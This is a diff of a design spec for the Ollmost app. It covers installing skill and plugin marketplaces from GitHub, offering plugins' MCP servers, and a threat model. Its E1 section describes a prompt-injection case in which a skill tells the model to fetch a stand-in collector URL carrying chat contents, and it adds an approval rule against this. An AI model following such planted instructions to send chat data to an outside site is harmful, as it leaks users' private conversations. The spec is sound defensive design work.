@@ -3,6 +3,11 @@
 - **Issue:** none yet. This spec is the proposal; the numbered decisions below are for review.
 - **Branch:** `claude/nifty-hopper-qf6f6a`.
 - **Status:** draft for review, 2026-09-26.
+- **Agreed in review (2026-09-26):**
+  - `web_fetch` asks first while a marketplace skill is active (decision 10, E1).
+  - The review offers a plugin's MCP servers (decision 11, C4).
+  - Commands move to [#90](https://github.com/EdCarney/ollmost/issues/90).
+  - Proxy support isn't part of this work.
 
 ## Goal
 
@@ -19,9 +24,13 @@ After this change:
 ## Non-goals
 
 - **The Discovery directory on claude.ai** (Customize → Skills → Browse). It has no public API: installs are tied to a claude.ai account, and only Claude Code's account sync reads them. This spec doesn't scrape it.
-- **Running anything a plugin ships**: no hooks, no MCP servers, no `npm install`, and never a `command` source. A plugin's scripts can only run through the existing sandboxed `run_code`, under its usual approval.
-- **Commands, agents and output styles.** Commands are prompt templates with `$ARGUMENTS`, which Ollmost's skills don't have.
-- **Git hosts other than GitHub** (open question 2).
+- **Running anything a plugin ships on its own**: no hooks, no `npm install`, and never a `command` source.
+  - A plugin's scripts can only run through the existing sandboxed `run_code`, under its usual approval.
+  - Its MCP servers run only if you add them yourself (C4).
+- **Commands.** Tracked in [#90](https://github.com/EdCarney/ollmost/issues/90), which starts with built-in commands such as `/compact` and takes plugin commands after.
+- **Agents and output styles.**
+- **Proxies and company certificates.** Downloads use global `fetch`, as Ollmost's requests to ollama.com do today. A network that needs a proxy or inspects TLS isn't supported here, as it isn't for those.
+- **Git hosts other than GitHub** (open question 1).
 - **Publishing** to a marketplace.
 
 ## Background: what's in the catalogs
@@ -59,6 +68,8 @@ Across the 303 skills whose files are in those repos:
 7. **Ids are fixed at install**: `market:<marketplace>/<plugin>:<skill>`. Chats store skill ids, so a later rename in the catalog never orphans them.
 8. **New installs start on**, but the review shows what they cost per request, and **Install turned off** is one click.
 9. **Reserved names are enforced as Claude Code does.** A marketplace calling itself `claude-plugins-official` (and the rest of Claude Code's reserved list) is refused unless it comes from `github.com/anthropics/`. Those from `anthropics/` get an **Anthropic** badge.
+10. **`web_fetch` asks first while a marketplace skill is active in the chat**, unless you already allowed that site for the chat (E1). *Agreed.*
+11. **A plugin's MCP servers are offered, never added.** **Add its MCP servers…** pre-fills Settings → Tools → Paste JSON, where you add them as you would any server (C4). *Agreed.*
 
 ## Part A: the model
 
@@ -70,6 +81,7 @@ Across the 303 skills whose files are in those repos:
 | `plugins/<marketplace>/<plugin>/` | An installed plugin's files | install, update |
 | `plugins/<marketplace>/<plugin>/.ollmost-install.json` | Its install record (A2) | install, update |
 | `plugins/.staging/<random>/` | Downloads under review, and the old copy during an update | review, update |
+| `plugin-data/<marketplace>/<plugin>/` | `${CLAUDE_PLUGIN_DATA}` for MCP servers you added from a plugin (C4) | those servers |
 | `marketplaces/.staging/<random>/` | A marketplace being added or refreshed | add, refresh |
 | settings table, key `skillMarketplaces` | The marketplaces you added (A3) | add, refresh, remove |
 | settings table, key `githubToken` | The optional token, encrypted with `safeStorage` like the ollama.com key | Settings |
@@ -190,7 +202,7 @@ For code runs, `readableFolders()` (`src/main/runner/provider.ts`) adds each plu
 | `github` (`repo`, `ref`, `sha`) | yes | GitHub archive |
 | `url` whose host is `github.com` | yes | GitHub archive |
 | `git-subdir` whose `url` is on `github.com` or `owner/repo` | yes | GitHub archive, keeping only `path` |
-| `url` / `git-subdir` on another host | no | "Ollmost can install from GitHub only, for now." Open question 2 |
+| `url` / `git-subdir` on another host | no | "Ollmost can install from GitHub only, for now." Open question 1 |
 | `archive` (a zip over HTTPS) | no | Needs a zip reader; no catalog above uses it |
 | `npm` | no | |
 | `command` | never | It runs a shell command on your Mac |
@@ -320,6 +332,22 @@ update:  .staging/<id> + .ollmost-commit
          .staging/<id>-old ──rm
 ```
 
+### C4. A plugin's MCP servers
+
+35 of the 61 plugins measured declare MCP servers: in `.mcp.json` at the plugin root, or as `mcpServers` in `plugin.json` (inline, or a path to a JSON file). Ollmost never starts them itself.
+
+- **Where they're offered.** The review and the installed plugin's page list the servers by name and command. **Add its MCP servers…** opens Settings → Tools → Paste JSON with them pre-filled as `{"mcpServers": {…}}`. That's the shape `parseServersJson` (`src/shared/mcpImport.ts`) already reads. From there it's the existing flow: they're added switched off for new chats, and every tool starts on **Ask**.
+- **What's filled in before pasting:**
+  - `${CLAUDE_PLUGIN_ROOT}` becomes the plugin's folder.
+  - `${CLAUDE_PLUGIN_DATA}` becomes `plugin-data/<marketplace>/<plugin>/` in the data folder. It's created on first use, kept across updates, and moved to the Trash on uninstall, mirroring Claude Code.
+- **Other `${NAME}` values.** An environment value written as `${NAME}` (a token the server expects from your environment) is imported as a variable with no value. The server stays locked until you enter it in Settings → Tools, the same missing-values state as after the move from Kiln.
+- **What's left out.** Remote servers (`url`, or type `http` / `sse`) are left out with `parseServersJson`'s existing message, since Ollmost runs local (stdio) servers only.
+- **Dependencies.** A server that runs the plugin's own code, such as `node ${CLAUDE_PLUGIN_ROOT}/servers/server.js`, may need its packages installed. Ollmost doesn't install them (non-goal), so when the plugin has a `package.json`, the dialog says to run `npm ci` in its folder first.
+- **Where each server came from.** A server added this way records `origin: { marketplace, plugin }`.
+  - Uninstalling the plugin lists those servers and offers to remove them too, since their commands point into its folder.
+  - An update whose MCP configuration changed says so in its review, with **Add its MCP servers…** again. Servers already added are never changed by an update.
+- **Trust.** Pasting and saving is the approval, as for any server today, and the README's trust rules apply unchanged: a changed command or environment sets tools back to Ask.
+
 ## Part D: interface
 
 ### D1. Skills view (`src/renderer/src/views/SkillsView.tsx`)
@@ -337,6 +365,7 @@ update:  .staging/<id> + .ollmost-commit
     - Its flags, and what's ignored.
     - The token cost.
     - **Install**, **Install turned off** and **Discard**.
+    - The plugin's MCP servers, if any, with **Add its MCP servers…** (C4).
   - For an update, the pane lists the files added, changed and removed, and **Update** replaces **Install**.
 - **Manage marketplaces…** at the foot of the Browse tab: a modal listing each marketplace with its source, commit, when it was fetched, and any error. It has **Refresh** and **Remove**, an **Add** field, the three Anthropic one-click entries, and the GitHub token field.
 
@@ -349,13 +378,34 @@ update:  .staging/<id> + .ollmost-commit
 
 | Risk | What stops it |
 | --- | --- |
-| A skill's instructions steer the model (prompt injection); `load_skill` never asks | You add each marketplace and install each plugin yourself, after reading it (decision 2). Installs are pinned: new text arrives only through an Update you review, with the changed files listed. Residual risk: web tools don't ask, so a reviewed-but-malicious skill could still tell the model to fetch a URL carrying chat data. Open question 1. |
-| A plugin runs code | Nothing a plugin ships is executed: no hooks, no MCP servers, no package installs, no `command` sources. Scripts run only through `run_code`, sandboxed and asking first unless you changed its setting. The sandbox can read plugin folders (A6) but can't write them. |
+| A skill's instructions steer the model (prompt injection); `load_skill` never asks | You add each marketplace and install each plugin yourself, after reading it (decision 2). Installs are pinned: new text arrives only through an Update you review, with the changed files listed. `web_fetch` asks first while one is active (E1). Residual risk: a site you allowed for the chat, and anything the model writes into its answer. |
+| A plugin runs code | Nothing a plugin ships is executed on its own: no hooks, no package installs, no `command` sources. Its MCP servers run only after you paste and save them yourself (C4). Scripts run only through `run_code`, sandboxed and asking first unless you changed its setting. The sandbox can read plugin folders (A6) but can't write them. |
 | A malicious archive writes outside its folder | B4: only files and folders, clean relative paths, `O_NOFOLLOW` writes inside a fresh staging folder, and size and count limits |
 | A lookalike of an official marketplace | Claude Code's reserved names, including its rule for other spellings of them, are refused unless the source is `github.com/anthropics/*`. Only those get the Anthropic badge. |
 | The GitHub token leaks | It's encrypted at rest and never reaches the renderer or a prompt. It's sent only to `api.github.com` and `github.com`. Redirects are followed manually, without it. |
 | A symlink inside an installed skill points elsewhere on this Mac | None are installed (B4). `readSkillFile`'s real-path check stays as a second guard. |
 | Licensing | Ollmost never bundles or redistributes anyone's skills. You download them from their source. The review shows each plugin's license: Anthropic's `docx`, `pdf`, `pptx` and `xlsx` skills are "source-available, not open source". |
+
+### E1. `web_fetch` while a marketplace skill is active
+
+A skill that passed review can still tell the model to fetch `https://collector.example/?d=<chat contents>`. So while a marketplace skill is active in a chat, `web_fetch` asks first.
+
+- **"Active"** means a marketplace skill is selected in the chat (`conversation.skills`) or was loaded there (`autoSkills`), including one loaded earlier in the same reply.
+  - `ToolContext` gains `marketplaceSkill: boolean`.
+  - `service.ts` sets it from the chat's selected and loaded ids. It sets it again when `load_skill` returns a marketplace skill mid-reply; `service.ts` already adds that id to `loadedIds` at that point.
+- **The rule, in `webTools.approval`:**
+  1. A chat with MCP servers or shared files: `ask-every-time`, as today. The stricter rule wins, because a site allowed for the chat mustn't carry those files out.
+  2. Otherwise, a marketplace skill active: `ask`.
+  3. Otherwise: `auto`, as today.
+- **Permission you already gave.**
+  - `ask` offers **Allow once**, **Allow for this chat** and **Deny**.
+  - **Allow for this chat** stores `web_fetch@<host>` (`webFetchAllowKey`, `src/shared/toolAllow.ts`), so later fetches to that site in that chat run without asking. Any other site still asks.
+  - A denial covers the site for the rest of the reply, as today.
+- **The approval card says why it's asking:** "A skill from <marketplace> is active in this chat."
+- **`web_search` doesn't ask.** Its query goes to Ollama's API, not to a site someone else controls; this is the same reasoning as `webTools.ts` today.
+- **Limits of this rule.**
+  - Ollmost can't tell which instructions led to a call, so a fetch you asked for yourself asks too while such a skill is active.
+  - Your own skills and the `~/.ollama/skills` and `~/.claude/skills` folders are unchanged.
 
 ## Part F: code changes
 
@@ -375,12 +425,17 @@ update:  .staging/<id> + .ollmost-commit
 | `src/main/chat/skillTools.ts` | The ambiguity error. The run hint names the plugin's folder. |
 | `src/main/chat/service.ts` | `skillIndex` filters out skills with `modelInvocable: false` |
 | `src/main/runner/provider.ts` | `readableFolders()` adds plugin roots |
+| `src/main/chat/tools.ts` | `ToolContext.marketplaceSkill` |
+| `src/main/chat/webTools.ts` | The E1 rule in `approval`, and the reason shown on the card |
+| `src/shared/mcpImport.ts` | `${CLAUDE_PLUGIN_ROOT}` and `${CLAUDE_PLUGIN_DATA}` substitution for a plugin's servers. An env value `${NAME}` becomes a variable with no value. |
+| `src/main/mcp/config.ts` | `origin` on a stored server |
+| `src/renderer/src/views/ToolsSettings.tsx` | Open Paste JSON pre-filled |
 | `src/main/settings.ts` | `setGitHubToken` / `getGitHubToken`, stored like the API key |
 | `src/main/index.ts` | Staging recovery (C3) before the first `listSkills()` |
 | `src/renderer/src/views/SkillsView.tsx` | Tabs, grouping, badges |
 | `src/renderer/src/components/skills/{BrowsePane,PluginReview,MarketplacesDialog}.tsx` | New |
 | `src/renderer/src/components/Composer.tsx` | `qualifiedName`, and hides `userInvocable: false` |
-| `README.md` | The Skills section: marketplaces, what's installed, what isn't, and the token |
+| `README.md` | The Skills section: marketplaces, what's installed, what isn't, and the token. Web search: `web_fetch` asks while a marketplace skill is active. |
 | `package.json` | `tar-stream` |
 
 ## Trade-offs considered
@@ -390,7 +445,7 @@ update:  .staging/<id> + .ollmost-commit
    - **The claude.ai directory:** the same catalog as the Claude app, but it has no public API, needs your claude.ai session, and could break at any release.
    - **Reading Claude Code's `~/.claude/plugins/`:** a tiny change, but it needs Claude Code installed and signed in, has no browsing, and ties Ollmost to Claude Code's internal folder layout. It remains a cheap follow-up alongside this.
 2. **How to download.**
-   - **`git` (sparse clone):** works with any host and with your credentials. But macOS's `/usr/bin/git` is a stub that asks to install the Command Line Tools when they're missing, and Ollmost is often opened from the Dock.
+   - **`git` (sparse clone):** works with any host. But it isn't on every Mac: `/usr/bin/git` is a stub that asks to install the Command Line Tools when they're missing. And by `src/main/code/git.ts`'s rule it may only run inside the sandbox, where your git config and credential helpers aren't available (open question 1).
    - **The GitHub REST API (trees plus raw files):** fetches only the files it needs, but it costs one or more API requests per plugin against 60 an hour, shared by everyone behind the same address.
    - **`codeload` archives plus git's ref list (chosen):** one request per download, with no API allowance used. It downloads the whole repository when only a subfolder is wanted (`git-subdir`), which costs bandwidth but not disk, since other entries are skipped unwritten. The 100 MB cap bounds it.
 3. **How to unpack.**
@@ -412,7 +467,7 @@ update:  .staging/<id> + .ollmost-commit
 - **Unit (Vitest, both CI jobs):**
   - **`sources.ts`:** a table of inputs → sources and entries → install plans, including reserved names, `metadata.pluginRoot` bare names, `..` and backslashes, `url` marketplaces with relative entries, and each unsupported type with its message.
   - **`catalog.ts`:**
-    - A fixture shaped like `anthropics/skills`: `source: "./"`, `strict: false`, and a `skills` list, where `document-skills` must get exactly 4 of the 17 skills.
+    - A fixture shaped like `anthropics/skills`: `source: "./"`, `strict: false`, and a `skills` list, where `document-skills` must get exactly 4 of the 19 skills.
     - A fixture shaped like `claude-plugins-official`: sha-pinned `git-subdir`, plus `renames`.
     - Per-entry validation errors.
   - **`unpack.ts`:** archives built in the test with `tar-stream`'s packer, covering:
@@ -435,25 +490,37 @@ update:  .staging/<id> + .ollmost-commit
     - `disable-model-invocation` and `user-invocable`.
     - Variable substitution.
     - Plugin roots in `readableFolders()`.
+  - **`webTools.approval`:** a table of chat states covering:
+    - none;
+    - a marketplace skill selected;
+    - one loaded mid-reply;
+    - one active alongside MCP servers or shared files, where `ask-every-time` wins;
+    - a site already allowed for the chat;
+    - an app skill only, which stays `auto`.
+  - **`mcpImport`:** the plugin substitutions, `${NAME}` env values that start locked, and remote servers left out.
 - **e2e (`e2e/run.mjs`):** a local folder marketplace (no network) → Browse → Review → Install turned on. Then, in a chat, `/plugin:skill` applies it, and a tools-capable model calls `load_skill` with the qualified name.
 - **By hand, before release:** add all three Anthropic marketplaces, then review and install `document-skills`, one `git-subdir` plugin and one plugin using `${CLAUDE_PLUGIN_ROOT}`. Run one of each's scripts with the code runner on.
 
 ## Rollout
 
-The work splits into four pull requests. Each builds on the one before.
+The work splits into five pull requests. Each builds on the one before.
 
-1. **Library:** qualified names, frontmatter flags, variables, the marketplace root reading install records, and `readableFolders()`. No network. Existing skills behave as before, apart from honouring `disable-model-invocation` and `user-invocable`.
+1. **Library and the `web_fetch` rule:** qualified names, frontmatter flags, variables, the marketplace root reading install records, `readableFolders()`, and E1. No network. E1 lands first so it's in place before anything can be installed. Existing skills behave as before, apart from honouring `disable-model-invocation` and `user-invocable`.
 2. **Main process:** sources, catalog, GitHub, unpack, install, recovery, IPC. Tests use fixtures and a fake `fetch`.
 3. **Interface:** Browse, Review, Manage marketplaces, grouping and badges; the e2e run; the README.
 4. **GitHub token and updates:** the token field, update detection, and the update review.
+5. **A plugin's MCP servers:** C4.
 
 ## Open questions
 
-1. **Web tools while a marketplace skill is active.** Should `web_fetch` and `web_search` ask first in a chat that has a marketplace skill selected or loaded? That would follow the precedent that turned off link previews in chats with tools or files ([#63](https://github.com/EdCarney/kiln/issues/63)). It costs friction in exactly the chats where those skills help.
-2. **Other git hosts.** Azure DevOps, GitLab and self-hosted git need `git`. Should v1 use `git` when it's on your PATH, and say it's needed when it isn't? The ref-list request in B3 is plain git over HTTPS, so it should work on those hosts too; only the download would differ.
-3. **A plugin's MCP servers.** Should the review offer **Add its MCP servers…**, pre-filling Settings → Tools → Paste JSON with the plugin's `.mcp.json`? Its `${CLAUDE_PLUGIN_ROOT}` would be replaced with the plugin's folder. This keeps Ollmost's rule that every server is added and trusted by hand. 35 of the 61 plugins measured have one.
-4. **Commands as skills.** Should `commands/*.md` be installed as skills? Claude Code treats them as skills; without `$ARGUMENTS`, many would read oddly.
-5. **Proxies.** Should Ollmost switch to `net.fetch`, which uses the system's proxy settings and the keychain's certificates, for this and for its existing requests? Global `fetch` doesn't use either, which matters on company networks. That's app-wide, so it's probably a separate issue.
+1. **Other git hosts in v1.** Azure DevOps, GitLab, Bitbucket and self-hosted servers have no download URL shared with GitHub, so Ollmost would run `git` to fetch from them.
+   - **Nothing is bundled.** Ollmost uses a `git` that's already installed. It finds one without triggering macOS's install prompt: `xcode-select -p` succeeds, or a `git` other than `/usr/bin/git` is on your login shell's PATH. When there's none, it says "Install Git to add marketplaces from <host>."
+   - **It runs sandboxed**, per `src/main/code/git.ts`:
+     - network only to that host, and writes only to the staging folder;
+     - `--no-recurse-submodules`, `-c core.symlinks=false`, `-c protocol.file.allow=never`, and a sparse, blob-less clone for `git-subdir`;
+     - the result goes through B4's rules like any archive.
+   - **The catch is private repositories.** The sandbox hides your home folder, so your git config and credential helpers (for example, Git Credential Manager for Azure DevOps) aren't available. A private repository on another host would need a token per host, like the GitHub one, sent with `-c http.extraHeader`.
+   - **In this work, or a follow-up?** GitHub covers every plugin in Anthropic's catalogs; other hosts matter for a team's own catalog.
 
 ## Sources
 
